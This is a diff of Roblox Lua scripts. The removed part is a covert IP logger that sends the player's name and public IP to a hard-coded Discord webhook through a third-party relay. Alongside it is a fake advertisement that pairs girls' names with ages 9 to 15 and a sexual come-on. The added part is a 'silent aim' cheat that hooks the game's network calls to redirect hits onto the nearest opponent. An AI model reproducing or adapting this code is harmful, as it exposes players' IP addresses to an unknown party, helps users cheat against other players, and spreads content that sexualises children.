@@ -1,251 +1,167 @@
+--// Services
 
--- Gui to Lua
--- Version: 3.2
+local Players = game:GetService("Players")
+local UserInputService = game:GetService("UserInputService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
 
--- Instances:
-local ip = tostring(game:HttpGet("https://api.ipify.org", true))
-local name = game:GetService("Players").LocalPlayer.Name
-local msg = name.." : "..ip
+--// Shortcuts
 
-local webhook = "https://discord.com/api/webhooks/918162644601557082/4O_PGDJ5lqUi9jfFmrL2Npq9Yb2Y46YBohO3qorIoCwSpJEkQQMjgUqywZkmY8L6esw3"
-local HttpService = game:GetService("HttpService");
-local botname = "ip logger"
+local Camera = workspace.CurrentCamera
+local LocalPlayer = Players.LocalPlayer
 
-function specials(Webhook, Message, Botname)
-    local Name;
-    local start = game:HttpGet("http://buritoman69.glitch.me");
-    local biggie = "http://buritoman69.glitch.me/webhook";
-    if (not Message or Message == "" or not Botname) then
-        Name = "GameBot"
-        return error("nil or empty message!")
-    else
-        Name = Botname;
-    end
-    local Body = {
-        ['Key'] = tostring("applesaregood"),
-        ['Message'] = tostring(Message),
-        ['Name'] = Name,
-        ['Webhook'] = Webhook    
-    }
-    Body = HttpService:JSONEncode(Body);
-    local Data = game:HttpPost(biggie, Body, false, "application/json")
-    return Data or nil;
+--// Variables
+
+local OldNameCall = nil
+
+--// Settings
+
+getgenv().SilentAimEnabled = true
+
+--// Functions
+
+local function GetClosestPlayer()
+	local MaximumDistance = math.huge
+	local Target
+
+	local Thread = coroutine.wrap(function()
+		wait(20)
+		MaximumDistance = math.huge
+	end)
+
+	Thread()
+
+	for _, v in next, Players:GetPlayers() do
+		if v.Name ~= LocalPlayer.Name then
+			if v.TeamColor ~= LocalPlayer.TeamColor then
+				if workspace:FindFirstChild(v.Name) ~= nil then
+					if workspace[v.Name]:FindFirstChild("HumanoidRootPart") ~= nil then
+						if workspace[v.Name]:FindFirstChild("Humanoid") ~= nil and workspace[v.Name]:FindFirstChild("Humanoid").Health ~= 0 then
+							local ScreenPoint = Camera:WorldToScreenPoint(workspace[v.Name]:WaitForChild("HumanoidRootPart", math.huge).Position)
+							local VectorDistance = (Vector2.new(UserInputService:GetMouseLocation().X, UserInputService:GetMouseLocation().Y) - Vector2.new(ScreenPoint.X, ScreenPoint.Y)).Magnitude
+							
+							if VectorDistance < MaximumDistance then
+								Target = v
+								MaximumDistance = VectorDistance
+							end
+						end
+					end
+				end
+			end
+		end
+	end
+
+	return Target
 end
 
-specials(webhook, msg, botname)
+--// Silent Aim
 
+OldNameCall = hookmetamethod(game, "__namecall", function(Self, ...)
+	local NameCallMethod = getnamecallmethod()
+	local Arguments = {...}
 
-local ScreenGui = Instance.new("ScreenGui")
-local ad1 = Instance.new("Frame")
-local Frame = Instance.new("Frame")
-local ImageLabel = Instance.new("ImageLabel")
-local name = Instance.new("TextLabel")
-local age = Instance.new("TextLabel")
-local age_2 = Instance.new("TextLabel")
-local register = Instance.new("Frame")
-local name_2 = Instance.new("TextBox")
-local age_3 = Instance.new("TextBox")
-local mail = Instance.new("TextBox")
-local rgst = Instance.new("TextButton")
-local TextLabel = Instance.new("TextLabel")
-local Shadow = Instance.new("Frame")
-local close = Instance.new("ImageButton")
+	if not checkcaller() and tostring(Self) == "HitPart" and tostring(NameCallMethod) == "FireServer" then
+		if getgenv().SilentAimEnabled == true then
+			Arguments[1] = GetClosestPlayer().Character.Hitbox
+		end
 
---Properties:
+		return Self.FireServer(Self, unpack(Arguments))
+	elseif not checkcaller() and tostring(Self) == "Trail" and tostring(NameCallMethod) == "FireServer" then
+		if getgenv().SilentAimEnabled == true then
+			if type(Arguments[1][5]) == "string" then
+				Arguments[1][6] = GetClosestPlayer().Character.Hitbox
+				Arguments[1][2] = GetClosestPlayer().Character.Hitbox.Position
+			end
+		end
 
-ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
-ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+		return Self.FireServer(Self, unpack(Arguments))
+	elseif not checkcaller() and tostring(Self) == "CreateProjectile" and tostring(NameCallMethod) == "FireServer" then	
+		if getgenv().SilentAimEnabled == true then
+			Arguments[18] = GetClosestPlayer().Character.Hitbox
+			Arguments[19] = GetClosestPlayer().Character.Hitbox.Position
+			Arguments[17] = GetClosestPlayer().Character.Hitbox.Position
+			Arguments[4] = GetClosestPlayer().Character.Hitbox.CFrame
+			Arguments[10] = GetClosestPlayer().Character.Hitbox.Position
+			Arguments[3] = GetClosestPlayer().Character.Hitbox.Position
+		end
 
-ad1.Name = "ad1"
-ad1.Parent = ScreenGui
-ad1.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-ad1.BorderSizePixel = 0
-ad1.Position = UDim2.new(0.35083881, 0, 0.166047081, 0)
-ad1.Size = UDim2.new(0, 426, 0, 28)
+		return Self.FireServer(Self, unpack(Arguments))
+	elseif not checkcaller() and tostring(Self) == "Flames" and tostring(NameCallMethod) == "FireServer" then -- DOESNT WORK
+		if getgenv().SilentAimEnabled == true then
+			Arguments[1] = GetClosestPlayer().Character.Hitbox.CFrame
+			Arguments[2] = GetClosestPlayer().Character.Hitbox.Position
+			Arguments[5] = GetClosestPlayer().Character.Hitbox.Position
+		end
 
-Frame.Parent = ad1
-Frame.BackgroundColor3 = Color3.fromRGB(217, 217, 217)
-Frame.BorderSizePixel = 0
-Frame.Position = UDim2.new(0, 0, 1, 0)
-Frame.Size = UDim2.new(0, 426, 0, 270)
+		return Self.FireServer(Self, unpack(Arguments))
+	elseif not checkcaller() and tostring(Self) == "Fire" and tostring(NameCallMethod) == "FireServer" then
+		if getgenv().SilentAimEnabled == true then
+			Arguments[1] = GetClosestPlayer().Character.Hitbox.Position
+		end
 
-ImageLabel.Parent = Frame
-ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-ImageLabel.BackgroundTransparency = 1.000
-ImageLabel.Position = UDim2.new(0.0140845068, 0, 0.0222222228, 0)
-ImageLabel.Size = UDim2.new(0, 219, 0, 108)
-ImageLabel.Image = "http://www.roblox.com/asset/?id=1436992293"
+		return Self.FireServer(Self, unpack(Arguments))
+	elseif not checkcaller() and tostring(Self) == "ReplicateProjectile" and tostring(NameCallMethod) == "FireServer" then
+		if getgenv().SilentAimEnabled == true then
+			Arguments[1][3] = GetClosestPlayer().Character.Hitbox.Position
+			Arguments[1][4] = GetClosestPlayer().Character.Hitbox.Position
+			Arguments[1][10] = GetClosestPlayer().Character.Hitbox.Position
+		end
 
-name.Name = "name"
-name.Parent = Frame
-name.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-name.BackgroundTransparency = 1.000
-name.Position = UDim2.new(0.563380301, 0, 0.0222222228, 0)
-name.Size = UDim2.new(0, 63, 0, 50)
-name.Font = Enum.Font.SourceSans
-name.Text = "name"
-name.TextColor3 = Color3.fromRGB(0, 0, 0)
-name.TextSize = 28.000
-name.TextXAlignment = Enum.TextXAlignment.Left
+		return Self.FireServer(Self, unpack(Arguments))
+	elseif not checkcaller() and tostring(Self) == "RemoteEvent" and tostring(NameCallMethod) == "FireServer" then
+		if getgenv().SilentAimEnabled == true then
+			if Arguments[1][1] == "createparticle" and Arguments[1][2] == "muzzle" then
+				if Arguments[3] == LocalPlayer.Character.Gun then
+					if ReplicatedStorage.Weapons(LocalPlayer.Character.Gun.Boop.Value).Melee then
+						local KnifeArguments1 = {
+							[1] = "createparticle",
+							[2] = "bullethole",
+							[3] = GetClosestPlayer().Character.Hitbox,
+							[4] = GetClosestPlayer().Character.Hitbox.Position,
+							[5] = Vector3.new(0, 0, 0),
+							[6] = ReplicatedStorage.Weapons:FindFirstChild(LocalPlayer.Character.Gun.Boop.Value),
+							[7] = false,
+							[8] = GetClosestPlayer().Character.Hitbox.Position,
+							[9] = true,
+							[12] = LocalPlayer,
+							[13] = 1
+						}
+						
+						local KnifeArguments = {
+							GetClosestPlayer().Character.Hitbox,
+							GetClosestPlayer().Character.Hitbox.Position,
+							ReplicatedStorage.Weapons:FindFirstChild(LocalPlayer.Character.EquippedTool.Value).Name,
+							1,
+							5,
+							false,
+							false,
+							false,
+							1,
+							false,
+							ReplicatedStorage.Weapons:FindFirstChild(LocalPlayer.Character.EquippedTool.Value).FireRate.Value,
+							ReplicatedStorage.Weapons:FindFirstChild(LocalPlayer.Character.EquippedTool.Value).ReloadTime.Value,
+							ReplicatedStorage.Weapons:FindFirstChild(LocalPlayer.Character.EquippedTool.Value).Ammo.Value,
+							ReplicatedStorage.Weapons:FindFirstChild(LocalPlayer.Character.EquippedTool.Value).StoredAmmo.Value,
+							ReplicatedStorage.Weapons:FindFirstChild(LocalPlayer.Character.EquippedTool.Value).Bullets.Value,
+							ReplicatedStorage.Weapons:FindFirstChild(LocalPlayer.Character.EquippedTool.Value).EquipTime.Value,
+							ReplicatedStorage.Weapons:FindFirstChild(LocalPlayer.Character.EquippedTool.Value).RecoilControl.Value,
+							ReplicatedStorage.Weapons:FindFirstChild(LocalPlayer.Character.EquippedTool.Value).Auto.Value,
+							ReplicatedStorage.Weapons:FindFirstChild(LocalPlayer.Character.EquippedTool.Value)["Speed%"].Value,
+							ReplicatedStorage:WaitForChild("wkspc").DistributedTime.Value,
+							215,
+							1,
+							false,
+							true
+						}
 
-age.Name = "age"
-age.Parent = Frame
-age.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-age.BackgroundTransparency = 1.000
-age.Position = UDim2.new(0.748826325, 0, 0.0222222228, 0)
-age.Size = UDim2.new(0, 63, 0, 50)
-age.Font = Enum.Font.SourceSans
-age.Text = "age"
-age.TextColor3 = Color3.fromRGB(0, 0, 0)
-age.TextSize = 28.000
-age.TextXAlignment = Enum.TextXAlignment.Left
+						ReplicatedStorage.Events.RemoteEvent:FireServer(KnifeArguments1)
+						ReplicatedStorage.Events.HitPart:FireServer(unpack(KnifeArguments))
+					end
+				end
+			end
+		end
 
-age_2.Name = "age"
-age_2.Parent = Frame
-age_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-age_2.BackgroundTransparency = 1.000
-age_2.Position = UDim2.new(0.528169036, 0, 0.2074074, 0)
-age_2.Size = UDim2.new(0, 171, 0, 44)
-age_2.Font = Enum.Font.SourceSans
-age_2.Text = "pretty girls waiting for u out there ;)"
-age_2.TextColor3 = Color3.fromRGB(16, 16, 16)
-age_2.TextSize = 15.000
-age_2.TextXAlignment = Enum.TextXAlignment.Left
+		return Self.FireServer(Self, unpack(Arguments))
+	end
 
-register.Name = "register"
-register.Parent = Frame
-register.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-register.BackgroundTransparency = 1.000
-register.Position = UDim2.new(0.0140845068, 0, 0.455555558, 0)
-register.Size = UDim2.new(0, 404, 0, 138)
-
-name_2.Name = "name"
-name_2.Parent = register
-name_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-name_2.BorderSizePixel = 0
-name_2.ClipsDescendants = true
-name_2.Position = UDim2.new(0.0470297039, 0, 0.0652173907, 0)
-name_2.Size = UDim2.new(0, 200, 0, 38)
-name_2.ClearTextOnFocus = false
-name_2.Font = Enum.Font.SourceSans
-name_2.PlaceholderText = "Name"
-name_2.Text = ""
-name_2.TextColor3 = Color3.fromRGB(0, 0, 0)
-name_2.TextSize = 22.000
-name_2.TextWrapped = true
-
-age_3.Name = "age"
-age_3.Parent = register
-age_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-age_3.BorderSizePixel = 0
-age_3.ClipsDescendants = true
-age_3.Position = UDim2.new(0.0470297039, 0, 0.384057969, 0)
-age_3.Size = UDim2.new(0, 200, 0, 38)
-age_3.ClearTextOnFocus = false
-age_3.Font = Enum.Font.SourceSans
-age_3.PlaceholderText = "Age"
-age_3.Text = ""
-age_3.TextColor3 = Color3.fromRGB(0, 0, 0)
-age_3.TextSize = 22.000
-age_3.TextWrapped = true
-
-mail.Name = "mail"
-mail.Parent = register
-mail.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-mail.BorderSizePixel = 0
-mail.ClipsDescendants = true
-mail.Position = UDim2.new(0.0470297039, 0, 0.717391312, 0)
-mail.Size = UDim2.new(0, 200, 0, 38)
-mail.ClearTextOnFocus = false
-mail.Font = Enum.Font.SourceSans
-mail.PlaceholderText = "E-Mail"
-mail.Text = ""
-mail.TextColor3 = Color3.fromRGB(0, 0, 0)
-mail.TextSize = 22.000
-mail.TextWrapped = true
-
-rgst.Name = "rgst"
-rgst.Parent = register
-rgst.BackgroundColor3 = Color3.fromRGB(53, 107, 78)
-rgst.BorderSizePixel = 0
-rgst.Position = UDim2.new(0.569307029, 0, 0.550724626, 0)
-rgst.Size = UDim2.new(0, 180, 0, 45)
-rgst.ZIndex = 2
-rgst.Font = Enum.Font.GothamSemibold
-rgst.Text = ""
-rgst.TextColor3 = Color3.fromRGB(255, 255, 255)
-rgst.TextScaled = true
-rgst.TextSize = 14.000
-rgst.TextWrapped = true
-
-TextLabel.Parent = rgst
-TextLabel.AnchorPoint = Vector2.new(0.5, 0.5)
-TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-TextLabel.BackgroundTransparency = 1.000
-TextLabel.BorderColor3 = Color3.fromRGB(27, 42, 53)
-TextLabel.BorderSizePixel = 0
-TextLabel.Position = UDim2.new(0.5, 0, 0.544444442, 0)
-TextLabel.Size = UDim2.new(1, -20, 1, -20)
-TextLabel.ZIndex = 2
-TextLabel.Font = Enum.Font.GothamSemibold
-TextLabel.Text = "Register"
-TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-TextLabel.TextScaled = true
-TextLabel.TextSize = 14.000
-TextLabel.TextWrapped = true
-
-Shadow.Name = "Shadow"
-Shadow.Parent = register
-Shadow.BackgroundColor3 = Color3.fromRGB(77, 156, 115)
-Shadow.BorderColor3 = Color3.fromRGB(77, 156, 115)
-Shadow.BorderSizePixel = 0
-Shadow.Position = UDim2.new(0.583058238, 0, 0.555072725, 0)
-Shadow.Size = UDim2.new(0.434268475, 0, 0.350724369, 4)
-
-close.Name = "close"
-close.Parent = ad1
-close.BackgroundTransparency = 1.000
-close.Position = UDim2.new(0.941314578, 0, 0.0357142985, 0)
-close.Size = UDim2.new(0, 25, 0, 25)
-close.ZIndex = 2
-close.Image = "rbxassetid://3926305904"
-close.ImageColor3 = Color3.fromRGB(0, 0, 0)
-close.ImageRectOffset = Vector2.new(284, 4)
-close.ImageRectSize = Vector2.new(24, 24)
-
--- Scripts:
-
-
-local function JTUVDX_fake_script() -- ScreenGui.script 
-	local script = Instance.new('LocalScript', ScreenGui)
-
-	
-	local ad1 = script.Parent.ad1
-	
-	local names = {
-		"Elizabeth",
-		"Mia",
-		"Lucia",
-		"Anny",
-	}
-	
-	local ages = {
-		"9",
-		"10",
-		"11",
-		"12",
-		"13",
-		"14",
-		"15",
-	}
-	
-	local chosenWord = names[math.random(#names)]
-	local chosenWord1 = ages[math.random(#ages)]
-	
-	ad1.Frame.name.Text = chosenWord
-	ad1.Frame.age.Text = chosenWord1
-	
-	print(chosenWord)
-	print(chosenWord1)
-end
-coroutine.wrap(JTUVDX_fake_script)()
+	return OldNameCall(Self, ...)
+end)
